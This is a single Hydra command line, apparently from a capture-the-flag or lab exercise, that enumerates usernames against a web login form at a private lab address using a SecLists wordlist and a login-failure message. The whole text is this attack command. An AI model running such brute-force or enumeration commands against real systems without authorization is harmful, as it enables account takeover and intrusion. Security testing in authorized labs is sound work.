hydra -L /usr/share/seclists/Usernames/Names/names.txt -p '' 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=hello:invalid username"

